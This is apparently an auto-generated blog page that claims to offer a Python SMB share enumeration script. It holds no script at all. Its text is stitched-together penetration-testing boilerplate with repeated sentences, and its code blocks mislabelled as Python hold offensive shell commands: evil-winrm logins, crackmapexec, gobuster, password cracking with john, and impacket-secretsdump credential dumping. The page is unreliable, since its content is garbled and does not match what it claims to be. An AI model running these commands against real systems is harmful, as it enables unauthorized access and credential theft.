---
TitleSEO: "SMB Share Enumeration Script in Python | ZureFX"
TitlePost: "SMB Share Enumeration Script — Python"
Author: "ZureFX"
Description: "A Python script for smb share enumeration script. Built for security research and automation."
Keywords: "bash, python, fuzzer, c, powershell"
URL: "https://zurefx.github.io/scripting/script-smb-share-enumeration-script-338.html"
URL_IMAGES: ""
Date: "2025-09-19"
Tags: "Bash, Python, Fuzzer, C, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-smb-share-enumeration-script-338"
Permalink: "/scripting/script-smb-share-enumeration-script-338.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The backup files contained sensitive information that should not have been accessible. Initial enumeration revealed several interesting open ports on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

Built with **Python** for offensive security automation.

### Requirements

- Python
- `msfvenom`
- `ligolo-ng`
- `kerbrute`

## Implementation

### Core Logic

Network traffic analysis revealed unencrypted communications containing user credentials. Authentication bypass was achieved through careful manipulation of the login mechanism.

```python
evil-winrm -i 10.23.111.8 -u administrator -p 'P@ssw0rd!'
```

The database credentials were hardcoded in the application source code. The application stored sensitive credentials in an unencrypted configuration file.

### Helper Functions

The scheduled task ran with elevated privileges and could be abused for escalation. The scheduled task ran with elevated privileges and could be abused for escalation.

```python
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.13.61.192 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.27.223.44/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Usage

### Basic Usage

Network traffic analysis revealed unencrypted communications containing user credentials. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
nmap -sCV -p135,993,8888 10.89.68.124 -oN scan.txt
evil-winrm -i 10.30.66.40 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Advanced Options

Weak file permissions allowed modification of critical system files. The web application was vulnerable to Server-Side Template Injection (SSTI). The application stored sensitive credentials in an unencrypted configuration file.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.108.97.95
```

## Output

### Example Output

Network traffic analysis revealed unencrypted communications containing user credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

```
[+] Scanning target...
[+] Found 20 results
[+] Done in 28.32s
```
